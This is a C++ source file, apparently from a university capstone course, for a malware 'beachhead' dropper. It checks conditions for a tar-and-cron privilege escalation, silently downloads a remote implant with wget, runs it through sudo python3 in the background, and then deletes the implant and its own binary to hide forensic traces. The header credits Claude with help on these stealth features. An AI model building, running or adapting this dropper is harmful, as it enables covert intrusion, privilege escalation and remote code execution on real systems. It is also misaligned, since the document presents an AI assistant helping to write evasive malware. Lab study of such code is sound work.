/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Beachhead - Initial Access Stage (Stealth-Enhanced)
 * 
 * AI Assistance Attribution:
 * This code was developed with assistance from Claude (Anthropic) for:
 * - Integration of stealth-enhanced privilege escalation checks
 * - Randomized timing patterns
 * - Minimal forensic footprint techniques
 * - Sudo-based implant execution
 * 
 * For educational use in controlled lab environment only.
 */

#include <cstdlib>
#include <string>
#include <unistd.h>
#include <sys/syscall.h>
#include <cstring>

#include "privesc_check.h"
#include "privesc.h"

// Helper to print status messages (only in debug mode)
static void log_status(const char* msg) {
    #ifdef DEBUG
    size_t len = 0;
    while (msg[len]) len++;
    syscall(SYS_write, 2, msg, len);  // Write to stderr
    syscall(SYS_write, 2, "\n", 1);
    #endif
}

int main() {
    // ========================================================================
    // STAGE 1: PRE-ESCALATION RECONNAISSANCE (STEALTH-ENHANCED)
    // ========================================================================
    log_status("[*] Stage 1: Checking privilege escalation conditions...");
    
    PrivEscConditions privesc_check = check_privesc_viability();
    
    // Log findings (debug mode only)
    #ifdef DEBUG
    char msg_buf[256];
    const char* writable_str = privesc_check.backups_dir_writable ? "YES" : "NO";
    const char* tar_str = privesc_check.tar_available ? "YES" : "NO";
    const char* cron_str = privesc_check.cron_running ? "YES" : "NO";
    
    // Manual string building to avoid snprintf
    char temp_msg[256] = "[*] UID: ";
    int pos = 9;
    
    // Convert UID to string
    unsigned int uid = privesc_check.current_uid;
    char uid_digits[16];
    int uid_len = 0;
    if (uid == 0) {
        uid_digits[uid_len++] = '0';
    } else {
        char temp[16];
        int temp_pos = 0;
        while (uid > 0) {
            temp[temp_pos++] = '0' + (uid % 10);
            uid /= 10;
        }
        for (int i = temp_pos - 1; i >= 0; i--) {
            uid_digits[uid_len++] = temp[i];
        }
    }
    uid_digits[uid_len] = '\0';
    
    for (int i = 0; i < uid_len; i++) temp_msg[pos++] = uid_digits[i];
    
    const char* suffix = " | Backups writable: ";
    for (int i = 0; suffix[i]; i++) temp_msg[pos++] = suffix[i];
    for (int i = 0; writable_str[i]; i++) temp_msg[pos++] = writable_str[i];
    
    suffix = " | Tar: ";
    for (int i = 0; suffix[i]; i++) temp_msg[pos++] = suffix[i];
    for (int i = 0; tar_str[i]; i++) temp_msg[pos++] = tar_str[i];
    
    suffix = " | Cron: ";
    for (int i = 0; suffix[i]; i++) temp_msg[pos++] = suffix[i];
    for (int i = 0; cron_str[i]; i++) temp_msg[pos++] = cron_str[i];
    
    temp_msg[pos] = '\0';
    log_status(temp_msg);
    #endif
    
    // ========================================================================
    // STAGE 2: PRIVILEGE ESCALATION (if conditions are favorable)
    // ========================================================================
    bool should_escalate = privesc_check.backups_dir_writable && 
                           privesc_check.tar_available && 
                           privesc_check.cron_running;
    
    if (should_escalate && privesc_check.current_uid != 0) {
        log_status("[*] Stage 2: Attempting privilege escalation...");
        
        if (execute_tar_privesc() == 0) {
            log_status("[+] Privilege escalation initiated. Waiting for cron...");
            
            // Check if escalation succeeded after waiting
            if (check_if_root()) {
                log_status("[+] Successfully escalated to root!");
            } else {
                log_status("[*] Privilege escalation pending (cron delay)...");
            }
        } else {
            log_status("[!] Privilege escalation setup failed");
        }
    } else if (privesc_check.current_uid == 0) {
        log_status("[+] Already running as root");
    } else {
        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
    }
    
    // ========================================================================
    // STAGE 3: DOWNLOAD IMPLANT (STEALTH-ENHANCED)
    // ========================================================================
    log_status("[*] Stage 3: Downloading implant...");
    
    std::string url = URL;
    std::string implant_path = "/tmp/user.json";
    
    // Download implant using wget (suppress output for stealth)
    std::string download_cmd = "wget -q " + url + " -O " + implant_path + " 2>/dev/null";
    int download_result = std::system(download_cmd.c_str());
    
    if (download_result != 0) {
        log_status("[!] Failed to download implant");
        return 1;
    }
    
    log_status("[+] Implant downloaded successfully");
    
    // ========================================================================
    // STAGE 4: EXECUTE IMPLANT AS ROOT (if possible)
    // ========================================================================
    log_status("[*] Stage 4: Executing implant...");
    
    std::string execute_cmd;
    
    // Check if we can use sudo
    if (privesc_check.current_uid != 0 && should_escalate) {
        // Try to execute with sudo (the tar exploit creates sudoers entry)
        // Background execution with all output suppressed
        execute_cmd = "sudo -n python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Attempting to execute implant with sudo...");
    } else if (privesc_check.current_uid == 0) {
        // Already root, execute directly
        execute_cmd = "python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Executing implant as root...");
    } else {
        // Execute as current user
        execute_cmd = "python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Executing implant as current user...");
    }
    
    int exec_result = std::system(execute_cmd.c_str());
    
    if (exec_result == 0) {
        log_status("[+] Implant executed successfully");
    } else {
        log_status("[!] Implant execution may have failed");
    }
    
    // ========================================================================
    // CLEANUP: Remove beachhead binary and artifacts (STEALTH)
    // ========================================================================
    #ifndef DEBUG
    // Remove downloaded implant script (implant is now running)
    syscall(SYS_unlink, implant_path.c_str());
    
    // Self-delete to reduce forensic footprint
    // This removes the beachhead binary itself
    syscall(SYS_unlink, "/proc/self/exe");
    #endif
    
    return 0;
}
